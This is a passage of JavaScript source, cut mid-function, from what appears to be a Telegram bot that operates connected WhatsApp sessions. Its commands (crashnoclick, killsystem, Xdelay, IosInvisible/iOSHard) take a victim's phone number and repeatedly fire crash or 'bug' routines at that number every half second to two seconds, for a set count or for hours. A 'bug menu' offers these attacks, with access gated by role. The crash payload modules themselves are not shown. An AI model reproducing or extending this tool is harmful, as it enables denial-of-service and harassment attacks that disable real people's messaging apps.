    const client = randomSession.sock;
    const senderNum = randomSession.num;

    try {

        log('command', msg.from.first_name, `Calling ${s7CM} on ${cleanTarget} via ${senderNum}`);
        
        const SYLoves = BvgSYLoVe(cleanTarget);
        await S7.sendPhoto(chatId, botConfig.logo, {
            caption: SYLoves,
            parse_mode: 'HTML'
        });

        const delayMs = 2000;

        if (args[2] === 'only') {
            const count = parseInt(args[3]);
            if (!count || count <= 0) {
                return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid count value', {
            parse_mode: 'HTML'            
            });
            }

            let sent = 0;

            const interval = setInterval(async () => {
                if (sent >= count) {
                    clearInterval(interval);
                    return;
                }

                try {
                    await crashnoclickLogic.crashnoclick(client, targetJid);
                    sent++;
                } catch (err) {
                    console.log(`[killsystem only] error: ${err.message}`);
                }
            }, delayMs);

        } else {
            const hours = parseInt(args[2]);
            if (!hours || hours <= 0) {
                return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid time value', {
            parse_mode: 'HTML'            
            });
            }

            const endTime = Date.now() + hours * 60 * 60 * 1000;

            const interval = setInterval(async () => {
                if (Date.now() >= endTime) {
                    clearInterval(interval);
                    return;
                }

                try {
                    await crashnoclickLogic.crashnoclick(client, targetJid);
                } catch (err) {
                    console.log(`[Delayhard time] error: ${err.message}`);
                }
            }, delayMs);
        }

    } catch (err) {
        log('error', s7CM, err.message);
        S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Error: ${err.message}`, {
            parse_mode: 'HTML'            
            });
    }
});


SYLoVe(['Forcebeta', 'clickBeta'], async (msg) => {
    const chatId = msg.chat.id.toString();
    const userId = msg.from.id.toString();
    const args = msg.text.split(' ');

    const s7CM = args[0].replace('/', '/').replace('.', ''); 

    if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);

    if (!waSessions[chatId] || waSessions[chatId].length === 0) {
        return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> No Number connected please use /reqpair to connect', {
            parse_mode: 'HTML'            
            });
    }

    if (args.length < 3) {
        return S7.sendMessage(
            chatId,
            `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Provide a phone number.\nExample: /${s7CM} +919876543210 1`, {
            parse_mode: 'HTML'            
            });
    }

    const cleanTarget = args[1].replace(/[^0-9]/g, '');
    const targetJid = `${cleanTarget}@s.whatsapp.net`;

    const randomSession = waSessions[chatId][Math.floor(Math.random() * waSessions[chatId].length)];
    const client = randomSession.sock;
    const senderNum = randomSession.num;

    try {

        log('command', msg.from.first_name, `Calling ${s7CM} on ${cleanTarget} via ${senderNum}`);
        
        const SYLoves = BvgSYLoVe(cleanTarget);
        await S7.sendPhoto(chatId, botConfig.logo, {
            caption: SYLoves,
            parse_mode: 'HTML'
        });

        const delayMs = 2000;

        if (args[2] === 'only') {
            const count = parseInt(args[3]);
            if (!count || count <= 0) {
                return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid count value', {
            parse_mode: 'HTML'            
            });
            }

            let sent = 0;

            const interval = setInterval(async () => {
                if (sent >= count) {
                    clearInterval(interval);
                    return;
                }

                try {
                    await killsystemLogic.killsystem(client, targetJid);
                    sent++;
                } catch (err) {
                    console.log(`[killsystem only] error: ${err.message}`);
                }
            }, delayMs);

        } else {
            const hours = parseInt(args[2]);
            if (!hours || hours <= 0) {
                return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid time value', {
            parse_mode: 'HTML'            
            });
            }

            const endTime = Date.now() + hours * 60 * 60 * 1000;

            const interval = setInterval(async () => {
                if (Date.now() >= endTime) {
                    clearInterval(interval);
                    return;
                }

                try {
                    await killsystemLogic.killsystem(client, targetJid);
                } catch (err) {
                    console.log(`[killsystem time] error: ${err.message}`);
                }
            }, delayMs);
        }

    } catch (err) {
        log('error', s7CM, err.message);
        S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Error: ${err.message}`, {
            parse_mode: 'HTML'            
            });
    }
});

SYLoVe('xdelay', async (msg) => {
    const chatId = msg.chat.id.toString();
    const userId = msg.from.id.toString();
    const args = msg.text.split(' ');

    const s7CM = args[0].replace('/', '/').replace('.', ''); 

    if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);

    if (!waSessions[chatId] || waSessions[chatId].length === 0) {
        return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> No Number connected please use /reqpair to connect', {
            parse_mode: 'HTML'            
            });
    }

    if (args.length < 3) {
        return S7.sendMessage(
            chatId,
            `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Provide a phone number.\nExample: /${s7CM} +919876543210 1`, {
            parse_mode: 'HTML'            
            });
    }

    const cleanTarget = args[1].replace(/[^0-9]/g, '');
    const targetJid = `${cleanTarget}@s.whatsapp.net`;

    const randomSession = waSessions[chatId][Math.floor(Math.random() * waSessions[chatId].length)];
    const client = randomSession.sock;
    const senderNum = randomSession.num;

    try {

        log('command', msg.from.first_name, `Calling ${s7CM} on ${cleanTarget} via ${senderNum}`);
        
        const SYLoves = BvgSYLoVe(cleanTarget);
        await S7.sendPhoto(chatId, botConfig.logo, {
            caption: SYLoves,
            parse_mode: 'HTML'
        });

        const delay = ms => new Promise(res => setTimeout(res, ms));

        if (args[2] === 'only') {
            const count = parseInt(args[3]);
            if (!count || count <= 0) {
                return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid count value', {
            parse_mode: 'HTML'            
            });
            }

            for (let i = 0; i < count; i++) {
            
                await testlogic.Xdelay(client, targetJid);
                await sleep(1000);
            }
        } else {
            const hours = parseInt(args[2]);
            if (!hours || hours <= 0) {
                return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid time value', {
            parse_mode: 'HTML'            
            });
            }

            const endTime = Date.now() + hours * 60 * 60 * 1000;

            while (Date.now() < endTime) {
                await testlogic.Xdelay(client, targetJid);
                await sleep(1000);
            }
        }

    } catch (err) {
        log('error', s7CM, err.message);
        S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Error: ${err.message}`, {
            parse_mode: 'HTML'            
            });
    }
});

SYLoVe(['IosInvisible', 'iOSHard'], async (msg) => {
    const chatId = msg.chat.id.toString();
    const userId = msg.from.id.toString();
    const args = msg.text.split(' ');

    const s7CM = args[0].replace('/', '/').replace('.', ''); 

    if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);

    if (!waSessions[chatId] || waSessions[chatId].length === 0) {
        return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> No Number connected please use /reqpair to connect', {
            parse_mode: 'HTML'            
            });
    }

    if (args.length < 3) {
        return S7.sendMessage(
            chatId,
            `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Provide a phone number.\nExample: ${s7CM} +919876543210 1`, {
            parse_mode: 'HTML'            
            });
    }

    const cleanTarget = args[1].replace(/[^0-9]/g, '');
    const targetJid = `${cleanTarget}@s.whatsapp.net`;

    const randomSession = waSessions[chatId][Math.floor(Math.random() * waSessions[chatId].length)];
    const client = randomSession.sock;
    const senderNum = randomSession.num;

    try {

        log('command', msg.from.first_name, `Calling ${s7CM} on ${cleanTarget} via ${senderNum}`);
        
        const SYLoves = BvgSYLoVe(cleanTarget);
        await S7.sendPhoto(chatId, botConfig.logo, {
            caption: SYLoves,
            parse_mode: 'HTML'
        });

        const delayMs = 500;

        if (args[2] === 'only') {
            const count = parseInt(args[3]);
            if (!count || count <= 0) {
                return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid count value', {
            parse_mode: 'HTML'            
            });
            }

            let sent = 0;

            const interval = setInterval(async () => {
                if (sent >= count) {
                    clearInterval(interval);
                    return;
                }

                try {
                    await IosLogic.IosInvisible(client, targetJid);
                    sent++;
                } catch (err) {
                    console.log(`[IosInvisible only] error: ${err.message}`);
                }
            }, delayMs);

        } else {
            const hours = parseInt(args[2]);
            if (!hours || hours <= 0) {
                return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid time value', {
            parse_mode: 'HTML'            
            });
            }

            const endTime = Date.now() + hours * 60 * 60 * 1000;

            const interval = setInterval(async () => {
                if (Date.now() >= endTime) {
                    clearInterval(interval);
                    return;
                }

                try {
                    await IosLogic.IosInvisible(client, targetJid);
                } catch (err) {
                    console.log(`[IosInvisible time] error: ${err.message}`);
                }
            }, delayMs);
        }

    } catch (err) {
        log('error', s7CM, err.message);
        S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Error: ${err.message}`, {
            parse_mode: 'HTML'            
            });
    }
});

        SYLoVe('listgc', async (msg) => {
    const chatId = msg.chat.id.toString();
    const userId = msg.from.id.toString();

    if (!LoveGlobalState(userId)) {
        return sendSYLove(S7, chatId);
    }

    if (!waSessions[chatId] || waSessions[chatId].length === 0) {
        return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> You have no connected WhatsApp numbers.\nUse /reqpair to connect one first.', {
            parse_mode: 'HTML'            
            });
    }

    let output = `⬣ <b>YOUR CONNECTED WHATSAPP GROUPS</b>\n\n`;
    let totalGroups = 0;
    let index = 1;

    for (const session of waSessions[chatId]) {
        const sock = session.sock;
        const num = session.num;

        try {
            const groupsObj = await sock.groupFetchAllParticipating();
            const groups = Object.values(groupsObj);

            if (groups.length === 0) continue;

            output += `📱 <b>Number:</b> <code>${num}</code>\n`;
            output += `━━━━━━━━━━━━━━━\n`;

            for (const group of groups) {
                const meta = await sock.groupMetadata(group.id);

                output += `❏ Group ${index++}\n`;
                output += `│⭔ <b>Name:</b> ${meta.subject || 'Unnamed'}\n`;
                output += `│⭔ <b>ID:</b> <code>${meta.id}</code>\n`;
                output += `│⭔ <b>Members:</b> ${meta.participants?.length || 0}\n`;
                output += `╰──────────────\n\n`;

                totalGroups++;
            }
        } catch (err) {
            log('error', 'LISTGC', `Failed for ${num} (user ${chatId}): ${err.message}`);
            output += `⚠️ Failed to fetch groups for number ${num}: ${err.message}\n\n`;
        }
    }

    if (totalGroups === 0) {
        return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> No groups found on your connected numbers.', {
            parse_mode: 'HTML'            
            });
    }

    output = 
        `⬣ <b>YOUR WHATSAPP GROUPS (${totalGroups} total)</b>\n\n` +
        `📦 <b>Your connected numbers:</b> ${waSessions[chatId].length}\n\n` +
        output;

    if (output.length > 4000) {
        const filePath = `./Love/listgc_${chatId}.txt`;
        fs.writeFileSync(filePath, output.replace(/<[^>]*>/g, ''));
        return S7.sendDocument(chatId, filePath, {
            caption: `📋 Full list of your WhatsApp groups (${totalGroups} groups)`
        });
    }

    S7.sendMessage(chatId, output, { parse_mode: 'HTML' });
});
                S7.on('callback_query', async (query) => {
            const chatId = query.message.chat.id;
            const messageId = query.message.message_id;
            const data = query.data;
            const userId = query.from.id;
            const name = query.from.username ? `@${query.from.username}` : query.from.first_name;
    const uptime = getRuntime();
    const love = userId.toString();
    const S7edit = (text, opts) => {
        S7.editMessageCaption(text, opts).catch((err) => {
            if (!err.message.includes('message is not modified')) {
                log('error', 'SYSTEM', err.message);
            }
        });
    };
            if (data === 'check_membership') {
                const isMember = await CheckSYlovesToo(S7, userId, botConfig.channelId, botConfig.groupId, botOwnerId);

                if (isMember) {
                    S7.deleteMessage(chatId, messageId).catch(() => {});
                    S7.sendMessage(chatId, 
                        `<tg-emoji emoji-id="5123248930124989216">✅</tg-emoji> <b>Membership verified!</b>\nYou are now a member of both the channel and group. Try your command again (e.g., /start or /reqpair).`, 
                        { parse_mode: 'HTML' }
                    );
                } else {
                    S7.answerCallbackQuery(query.id, { 
                        text: '❌ You have not joined both the Channel and Group yet!', 
                        show_alert: true 
                    });
                }
            };


            // ---- Rich menu navigation (robust: rich -> resend -> classic) ----
            const SY_ownerUrl = 'https://t.me/' + String(config.S7 || '').replace('@', '');
            async function SY_nav(html, classicHtml, classicKb, loadingLabel) {
                const userId = query.from.id.toString();
                if (!LoveGlobalState(userId)) {
                    return sendSYLove(S7, chatId);
                }
                if (botConfig.protection) {
                    const isMember = await CheckSYlovesToo(S7, query.from.id, botConfig.channelId, botConfig.groupId, botOwnerId);
                    if (!isMember) {
                        await S7.answerCallbackQuery(query.id, {
                            text: 'Please join all required channels/groups first.',
                            show_alert: true
                        }).catch(() => {});
                        return S7.sendMessage(chatId, protectionMessage, {
                            parse_mode: 'HTML',
                            ...VOIDSEC()
                        });
                    }
                }
                if (RICH_OK) await SY_richLoading(S7, chatId, messageId, loadingLabel);
                const shown = await SY_showRich(S7, chatId, messageId, html);
                if (!shown) await SY_classicSwap(S7, chatId, messageId, classicHtml, classicKb);
                S7.answerCallbackQuery(query.id).catch(() => {});
            }

            if (data === 'misc_menu') {
                const role = GetSYLoVe(query.from.id.toString());
                const banner = SY_bannerUrl(S7);
                await SY_nav(
                    SY_miscHTML(banner, name, uptime, role, botConfig.ownerContact),
                    SY_classicHead(name, uptime, role, botConfig.ownerContact) + '\n' + SY_classicMisc(),
                    SYClassicBackKb, 'Loading Misc Menu'
                );
            }

            if (data === 'bug_menu') {
                const role = GetSYLoVe(query.from.id.toString());
                const banner = SY_bannerUrl(S7);
                await SY_nav(
                    SY_bugHTML(banner, name, uptime, role, botConfig.ownerContact),
                    SY_classicHead(name, uptime, role, botConfig.ownerContact) + '\n' + SY_classicBug(),
                    SYClassicBackKb, 'Loading Bug Menu'
                );
            }

            if (data === 'main_menu') {
                const role = GetSYLoVe(query.from.id.toString());
                const banner = SY_bannerUrl(S7);
                await SY_nav(
                    SY_mainHTML(banner, name, uptime, role, botConfig.ownerContact, botConfig.channel, botConfig.group, SY_ownerUrl),
                    SY_classicHead(name, uptime, role, botConfig.ownerContact) + '\n👑 Neeche button dabao',
                    SABIR7718, 'Loading'
                );
            }

            if (data === 'learn_menu' || data.startsWith('learn_lang_')) {
                const role = GetSYLoVe(query.from.id.toString());
                const banner = SY_bannerUrl(S7);
                const lang = data.startsWith('learn_lang_') ? data.split('_')[2] : 'en';
                await SY_nav(
                    SY_learnHTML(banner, name, uptime, role, botConfig.ownerContact, lang),
                    SY_classicHead(name, uptime, role, botConfig.ownerContact) + '\n' + SY_classicLearn(lang),
                    SYClassicBackKb, 'Loading Guide'
                );
            }

            if (data === 'my_info') {
                const role = GetSYLoVe(query.from.id.toString());
                const banner = SY_bannerUrl(S7);
                await SY_nav(
                    SY_myinfoHTML(banner, name, uptime, role, botConfig.ownerContact, query.from),
                    SY_classicHead(name, uptime, role, botConfig.ownerContact) + '\n' + SY_classicMyinfo(role, uptime, query.from),
                    SYClassicBackKb, 'Loading Info'
                );
            }
                
                
             if (data.startsWith('copy_jid_')) {
        const jid = data.replace('copy_jid_', '');
        await S7.answerCallbackQuery(query.id, {
            text: 'JID copied to clipboard!',
            show_alert: false
        });
    }
           });

    } catch (err) {
        log('error', 'STARTUP', `Could not start bot with token: ${token.substring(0, 10)}...`);
    }
}

// Start SYLove Bot
startSYloveBot(config.mainToken);
